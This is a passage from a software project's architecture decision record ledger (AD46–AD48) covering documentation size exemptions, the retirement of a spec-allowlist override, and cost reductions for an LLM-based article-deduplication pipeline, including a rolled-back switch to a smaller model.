**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-coordinated-multi-tag-scrape-pipeline), [REQ-SET-001](../../sdd/settings.md#req-set-001-tag-management-ui)

---

### AD46: Documentation file-size hatches and hybrid renderings (deployment colocation, architecture diagrams, ADR index, deployment hybrid shape)

**Status:** Accepted (2026-05-12)

**Decision:** Three documentation files exceed the per-file soft budgets from `documentation-discipline.md` Pass 2 and carry intentional `doc-allow-large` hatches. This AD formalizes the three carve-outs so the hatch markers point at a discoverable decision rather than at bare prose.

- **AD46a — `deployment.md` colocation.** Deploy runbook, dev-bypass, and admin-routes contract colocate in `deployment.md`. Splitting them (admin-routes to `api-reference.md`, dev-bypass to `troubleshooting.md`) fragments the operator's linear deploy workflow across three files.

  The three sections form one operational document: a contributor executing a deploy needs all of them in a single scroll without context-switching between files.
- **AD46b — `architecture.md` diagram-section exemption.** Two ASCII data-flow diagrams (component map and pipeline flow) are load-bearing reference art. Each must sit beside its surrounding prose in one scroll; splitting diagram from caption breaks the reader's model.

  The file's total line count is dominated by these diagrams and their immediate context, not by prose drift elsewhere in the file.
- **AD46c — `decisions/README.md` single-file design.** All ADRs colocate here rather than one-file-per-ADR. Per-file ADR storage fragments cross-references: ADR-A frequently cites ADR-B via section anchor; separate files make anchor stability fragile.

  The chronological reading path (`AD1 → AD46`) works as a single document. The file IS the index.
- **AD46d — `deployment.md` hybrid runbook-and-registry rendering.** `deployment.md` legitimately mixes per-item runbook sections (`## Local Development`, `## Production Deployment`, `## Integration deployment` — each with `**When:** / **Command:** / **Verifies:** / **Rollback:**`) with grouped-table registry sections (`### Environment-specific configuration`, `## Cloudflare Resources`, `### PR Checks - CI gates`, `## Admin-only routes` layer table). The two shapes serve two different reader tasks: the runbook shape walks the operator through a sequenced procedure; the registry shape lets the operator look up a resource, env, or gate at a glance.

  `documentation-discipline.md` Pass 6 (file-level shape consistency) treats hybrid files as a soft signal because the first-section-wins tiebreak would force one shape across the entire file. For `deployment.md`, that conversion would either bloat the registry tables into per-item sections (15+ rows × 4 fields each) or strip the runbook scaffolding from the deploy procedures. AD46d formalizes the hybrid rendering: Pass 6 findings against `deployment.md` are accepted under this ADR and not re-flagged on subsequent runs.

**Context:** `documentation-discipline.md` Pass 6 (hatch audit) flags bare `doc-allow-large` markers as MEDIUM and prose-justification-without-ADR markers as the same shape the rule was written to prevent. Cycle 3 review (CF-006) flagged four markers across `deployment.md`, `architecture.md` (×2), and `decisions/README.md` that all carried the same root justification but no ADR backlink. The cycle 5 follow-up surfaced AD46d as a co-occurring concern: Pass 6 shape consistency fires against `deployment.md` in the same way Pass 2 file-size budgets fire against the AD46a-c targets — a structural rule firing on a section the discipline's content-preservation guarantees would refuse to mechanically convert.

**Rationale:** The hatch was designed to surface design tradeoffs as ADRs — a decision the reader can discover, revisit, and supersede. A bare or prose-only marker hides the decision in the marker itself. This AD pulls the decisions into the discoverable ADR ledger; the markers become referential, not load-bearing.

**Consequences:**

- The four affected markers now reference `AD46` directly (e.g., `doc-allow-large: AD46 deployment-doc colocation`). The `doc-updater` Pass 6 audit accepts them under the ADR-reference rule.
- Future doc growth in any of the three files MUST reopen this AD before a new bare hatch lands. A bare `doc-allow-large` marker on these files without an AD46-or-successor reference is a `doc-updater` HIGH finding.
- If `deployment.md` grows to the point where the operator workflow itself becomes hard to follow, the split should be a deliberate workflow redesign (e.g., a master deploy runbook with linked sub-pages), not a lane-discipline split.
- Pass 6 (file-level shape consistency) findings against `deployment.md` are accepted under AD46d's hybrid-rendering carve-out. If a future review surfaces a shape-mismatch in a section that does NOT serve a runbook-or-registry purpose, AD46d does not cover it and the standard Pass 6 conversion applies.
- The ADR ledger's single-file design implicitly limits the ledger's growth ceiling. If the ledger reaches 50 ADRs or 2500 lines, the next PR-boundary `doc-updater` run MUST escalate this AD for revision before accepting further ADR additions to the single file.

**Related requirements:** none direct — operational/documentation concern.

---

### AD46e: `api-reference.md` completeness exemption

**Status:** Accepted (2026-05-13)

**Extends:** AD46

**Decision:** `documentation/api-reference.md` carries a permanent `doc-allow-large: AD46e api-reference completeness` hatch. The file documents the public HTTP surface across 13 `##` named sections — endpoint count measured via `grep -c '^### ' documentation/api-reference.md` on 2026-05-13. Each endpoint requires at minimum a method/path block, Authentication field, Origin-check field, Response table, and Implements field — 8-12 lines of structured content per endpoint, derived from the binding endpoint template in `documentation-discipline.md` Pass 7. The resulting floor is the endpoint count times the per-endpoint cost before any prose explanation. The per-file soft budget of 600 lines reflects a general-purpose file; an API reference for a non-trivial application necessarily exceeds it.

**Context:** Pass 2 of `documentation-discipline.md` flagged `api-reference.md` at 1.16x the 600-line budget (697 lines) as a LOW finding in the 2026-05-13 clean run. The corresponding Pass 10 cold-read found PARTIAL — session-auth endpoints had no copy-pasteable curl example. Both findings were deferred in that run. The user rejected the deferral on 2026-05-13 and mandated: (a) a formal AD46 sub-decision backlink, and (b) a curl example covering the session-cookie auth shape so a cold reader can test any session-auth endpoint without consulting other documentation. The curl example adds approximately 10 lines to the file, reinforcing that the 600-line budget is structurally unachievable for this file's mandate.

**Rationale:**

- Splitting `api-reference.md` into domain-scoped files (e.g., `api-reference-auth.md`, `api-reference-digest.md`) would fragment the single-lookup guarantee: a developer searching for an endpoint must know which sub-file it lives in before they can find it. The admin split (`api-reference-admin.md`) was made on the audience boundary (developer vs. operator), not on section count.
- The existing `api-reference-admin.md` split demonstrates the correct split criterion: separate audience, separate file. Splitting by section count alone does not serve a distinct reader.
- A curl example in the `## Conventions` section is the minimal fix for the Pass 10 partial: one canonical block shows the cookie-injection pattern; all ~60 session-auth endpoints can be tested by substituting the path. Duplicating the block per-endpoint would triple the file size without adding information.

**Consequences:**

- `api-reference.md` is exempt from Pass 2 LOW findings indefinitely. MEDIUM threshold (1.4x, ~840 lines) remains in force — if the file approaches that level, a genuine split by audience or by stable domain boundary should be evaluated before adding more content. 1.4x is the threshold because it sits above the per-endpoint structural floor with ~25% headroom for future endpoint growth before a split becomes mandatory.
- The `doc-allow-large` hatch marker is updated from the bare `AD46 api-reference single-file design` to `AD46e api-reference completeness` so the hatch points at this specific sub-decision.
- The `## Conventions` curl example covers the session-cookie shape. Dev-bypass token endpoints are covered separately in `documentation/deployment.md` under the dev-bypass runbook. The two examples together close Pass 10 for this file.
- Future endpoint additions to `api-reference.md` do not require a new ADR amendment unless the file crosses the MEDIUM threshold.

**Related requirements:** none direct — documentation structure concern.

---

### AD47: Storage-shape allowlist promoted to spec-discipline; AD9 superseded

**Status:** Accepted (2026-05-13)

**Supersedes:** AD9

**Decision:** Retire AD9 as a load-bearing override. `spec-discipline.md`'s forbidden-content allowlist now contains a first-class carveout for "Database column / KV key names when the storage shape IS the persistence contract" — the same rationale AD9 was created to apply on a per-REQ basis. The eight REQs listed in AD9's `Overrides:` line (`REQ-DISC-001`, `REQ-DISC-002`, `REQ-AUTH-002`, `REQ-AUTH-008`, `REQ-SET-001`, `REQ-SET-005`, `REQ-MAIL-001`, `REQ-MAIL-003`) pass the allowlist by default and no longer need an ADR-anchored override.

**Context:** AD9 was added on 2026-05-03 to override the mechanism-leakage rule for storage-shape names that are the contract noun shared between UI controls, persisted rows, and dispatcher predicates. As the same pattern recurred across eight REQs in three domains, the override mechanism was promoted to a first-class allowlist rule on 2026-05-13. `sdd/config.yml`'s `forbidden_content_overrides:` field was already empty (`[]`); AD9's `Overrides:` line was documentation-only and not driving enforcement. With the allowlist in place, the override mechanism is fully redundant.

**Rationale:**

- One global allowlist rule is easier to reason about than an ADR-anchored per-REQ override list. A new storage-shape REQ no longer needs an ADR amendment to pass spec-reviewer.
- The contract-noun framing from AD9 carries over verbatim to the allowlist rule, so no behavioral change occurs — the same REQs that AD9 covered are the ones the allowlist covers.
- AD9's body is preserved as historical artifact under `Status: Superseded by AD47`. Readers tracing the lineage of the storage-shape carveout land on AD9 first and follow the supersession pointer to AD47 and the allowlist rule itself.

**Consequences:**

- AD9 is marked `Status: Superseded by AD47 (2026-05-13)`. AD9's decision/consequences sections stay untouched per ADR immutability.
- The eight REQs listed in AD9's `Overrides:` line continue to render verbatim. No spec edits are needed.
- Future storage-shape REQs (D1 columns, KV key shapes) pass automatically; no new ADR required for the same pattern.
- If a future audit ever wants to tighten the carveout — e.g., to only cover column names appearing in user-facing settings UIs — the allowlist is the place to scope, not a new ADR.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-DISC-002](../../sdd/discovery.md#req-disc-002-discovery-progress-visibility), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-AUTH-008](../../sdd/authentication.md#req-auth-008-refresh-token-rotation-and-replay-detection), [REQ-SET-001](../../sdd/settings.md#req-set-001-unified-first-run-and-edit-flow), [REQ-SET-005](../../sdd/settings.md#req-set-005-email-notification-preference), [REQ-MAIL-001](../../sdd/email.md#req-mail-001-digest-ready-email-content), [REQ-MAIL-003](../../sdd/email.md#req-mail-003-scheduled-send-policy-and-opt-out)

---

### AD48: Dedup cost reduction: borderline-rerank watermark + batched rerank call + pipeline-wide gpt-oss-20b

**Status:** Accepted with one rollback (2026-05-14). Items 1 and 2 (watermark + batched rerank) remain in production. Item 3 (model swap to gpt-oss-20b) was reverted same day after the first production run (`pipeline_run 01KRJYV8R0D0EX7HBPR2VS2YCT`) failed with `scrape_wait_stalled`: every `scrape-chunks` queue invocation produced `outcome=canceled` mid-LLM-call, the same wall-clock failure mode that took Gemma 4 26B out of contention. `DEFAULT_MODEL_ID` was flipped back to `@cf/openai/gpt-oss-120b`.

**Decision:** Stack three independent cost reductions on the dedup pipeline:

1. **Watermark skip on the recurring sweep.** Persist the timestamp of the last successful auto-sweep in KV (`dedup:auto_sweep_watermark`). At the start of the borderline rerank pass, skip the LLM call for any pair whose two articles were both already in the corpus at that prior watermark; their same-event verdict was recorded by the previous sweep and the model is deterministic at temperature 0.
2. **Batched rerank call.** Replace the per-pair `rerankBorderlinePair(a, b)` API with `rerankBorderlinePairsBatch(pairs[])` (cap 15 pairs per call). Both rerank callers (in-tick finalize, sweep PASS 2) accumulate borderline candidates and issue one LLM round-trip per self instead of one per pair. Parse failure on a batched response is treated as `same_event: false` for every pair in that batch (matches the pre-AD48 single-pair conservative default).
3. **Pipeline-wide model swap.** Flip `DEFAULT_MODEL_ID` in `src/lib/models.ts` from `@cf/openai/gpt-oss-120b` to `@cf/openai/gpt-oss-20b`. The constant is the single source of truth for every pipeline LLM call (chunk summarisation, rerank, discovery); changing it routes the whole pipeline through the cheaper sibling. Same OpenAI family, same 128K context, same native JSON mode at $0.20 / $0.30 per Mtok versus $0.35 / $0.75.

**Context:** The auto-sweep walks the last 7 days every 4 hours (REQ-PIPE-003 + AD41). Borderline cosine pairs in `[0.70, 0.78)` were sent to the LLM one-pair-at-a-time. With a 7-day window and 6 sweeps per day, each unresolved pair was reranked up to ~42 times before it aged out, every time paying ~300-token system prompt + ~400-token payload at temperature 0 — deterministic re-asking of a verdict already on record. The 7-day window and 4-hour cadence are non-negotiable (the window is the per-pair time-distance gate validated by PANW-cluster spans of ~100h; cadence catches Vectorize eventual-consistency same-tick misses and late-arriving older articles per AD42 history).

**Alternatives considered:**
- *Sweep throttle (cadence cut).* Rejected per project direction: cadence is the only protection against eventual-consistency same-tick misses and late-arriving feed items.
- *7-day window shrink.* Rejected: PANW cluster spans ~100 hours; a 1-day window misses the cluster's far edges (AD39 history).
- *D1 verdict cache table.* Considered. Rejected as heavier than KV watermark for the dominant case ("the same auto-sweep is re-judging pairs it already judged last sweep"). A per-pair cache adds a migration, a row per borderline pair, and write-path complexity for marginal recall on top of the watermark.
- *All pairs in one global LLM call.* Rejected: attention dilution and JSON-parse blast radius scale with pair count. 15 per call keeps each round-trip well below 1K output tokens and limits parse-failure loss.
- *Rerank-only model swap (chunk stays 120b).* Rejected per project direction favouring single-model simplicity over per-call-site model splitting. `DEFAULT_MODEL_ID` stays the one knob.

**Consequences:**
- Auto-sweep LLM cost drops roughly an order of magnitude on the recurring case (watermark skip eliminates re-judgment of pre-watermark pairs; batched call amortises system prompt + round-trip across pairs from the same self).
- Chunk summarisation cost stays at gpt-oss-120b prices after the same-day 20b rollback (see Status). The ~60% chunk savings projected in the original AD48 are not realised.
- Operator-triggered `/api/admin/historical-dedup` and `?reembed=1` invalidate the watermark (the latter via `clearWatermark`, the former via a `bypassWatermark: true` flag propagated through every continuation queue message) so a manual sweep after a threshold or prompt change re-judges everything.
- Test fixtures that previously mocked single-pair `{"same_event": ...}` responses now mock the batched `{"verdicts":[{"i":N,"same_event":...}]}` shape; a no-verdicts response degrades to "all false" per pair, preserving the conservative default.

**Related requirements:** [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract), [REQ-PIPE-009](../../sdd/generation.md#req-pipe-009-llm-re-rank-pass-for-borderline-same-story-candidates), [REQ-SET-004](../../sdd/settings.md#req-set-004-server-side-model-catalog-and-default)

---

## Related Documentation

- [Architecture](../architecture.md) - System overview and component map
- [Configuration](../configuration.md) - Env vars, bindings, KV key conventions

---
